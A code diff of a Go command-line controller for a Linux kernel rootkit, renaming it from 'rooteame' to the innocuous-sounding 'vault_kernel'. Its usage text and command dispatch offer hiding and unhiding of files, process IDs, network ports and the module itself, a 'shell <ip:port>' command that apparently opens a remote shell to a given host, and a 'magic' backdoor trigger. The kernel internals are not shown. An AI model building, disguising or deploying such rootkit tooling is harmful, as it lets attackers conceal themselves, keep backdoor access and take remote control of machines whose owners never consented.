@@ -8,10 +8,10 @@ import (
 	"strings"
 	"unsafe"
 
-	"github.com/ruby570bocadito/rooteame/internal/ioctl"
+	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
-const devicePath = "/dev/rooteame"
+const devicePath = "/dev/vault_kernel"
 
 func openDevice() (*os.File, error) {
 	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
@@ -181,10 +181,10 @@ func unhideModule(f *os.File) error {
 }
 
 func printUsage() {
-	fmt.Print(`rooteame CLI — Kernel Rootkit Control
+	fmt.Print(`vault_kernel CLI — Kernel Rootkit Control
 
 Usage:
-  rooteame <command> [arguments]
+  vault_kernel <command> [arguments]
 
 Commands:
   status           Check if rootkit is loaded
@@ -213,10 +213,10 @@ func run() error {
 
 	if os.Args[1] == "status" {
 		if _, err := os.Stat(devicePath); err == nil {
-			fmt.Printf("[*] rooteame kernel module is LOADED\n    Device: %s\n", devicePath)
+			fmt.Printf("[*] vault_kernel kernel module is LOADED\n    Device: %s\n", devicePath)
 		} else {
-			fmt.Println("[*] rooteame kernel module is NOT loaded")
-			fmt.Println("    Run: sudo insmod rooteame.ko")
+			fmt.Println("[*] vault_kernel kernel module is NOT loaded")
+			fmt.Println("    Run: sudo insmod vault_kernel.ko")
 		}
 		return nil
 	}
@@ -244,19 +244,19 @@ func run() error {
 
 	case "hide-file":
 		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: rooteame hide-file <name>")
+			return fmt.Errorf("usage: vault_kernel hide-file <name>")
 		}
 		return hideFile(f, os.Args[2])
 
 	case "unhide-file":
 		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: rooteame unhide-file <name>")
+			return fmt.Errorf("usage: vault_kernel unhide-file <name>")
 		}
 		return unhideFile(f, os.Args[2])
 
 	case "hide-pid":
 		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: rooteame hide-pid <pid>")
+			return fmt.Errorf("usage: vault_kernel hide-pid <pid>")
 		}
 		pid, err := strconv.Atoi(os.Args[2])
 		if err != nil {
@@ -266,7 +266,7 @@ func run() error {
 
 	case "unhide-pid":
 		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: rooteame unhide-pid <pid>")
+			return fmt.Errorf("usage: vault_kernel unhide-pid <pid>")
 		}
 		pid, err := strconv.Atoi(os.Args[2])
 		if err != nil {
@@ -276,7 +276,7 @@ func run() error {
 
 	case "hide-port":
 		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: rooteame hide-port <port>")
+			return fmt.Errorf("usage: vault_kernel hide-port <port>")
 		}
 		p, err := strconv.Atoi(os.Args[2])
 		if err != nil || p < 1 || p > 65535 {
@@ -286,7 +286,7 @@ func run() error {
 
 	case "unhide-port":
 		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: rooteame unhide-port <port>")
+			return fmt.Errorf("usage: vault_kernel unhide-port <port>")
 		}
 		p, err := strconv.Atoi(os.Args[2])
 		if err != nil || p < 1 || p > 65535 {
@@ -299,7 +299,7 @@ func run() error {
 
 	case "shell":
 		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: rooteame shell <ip:port>")
+			return fmt.Errorf("usage: vault_kernel shell <ip:port>")
 		}
 		target := os.Args[2]
 		if !strings.Contains(target, ":") {
@@ -309,7 +309,7 @@ func run() error {
 
 	case "magic":
 		if len(os.Args) < 3 {
-			return fmt.Errorf("usage: rooteame magic <word>")
+			return fmt.Errorf("usage: vault_kernel magic <word>")
 		}
 		return backdoorMagic(f, os.Args[2])
 
@@ -326,7 +326,7 @@ func run() error {
 		return unhideModule(f)
 
 	default:
-		return fmt.Errorf("unknown command: %s\nRun 'rooteame help' for usage", cmd)
+		return fmt.Errorf("unknown command: %s\nRun 'vault_kernel help' for usage", cmd)
 	}
 }
 
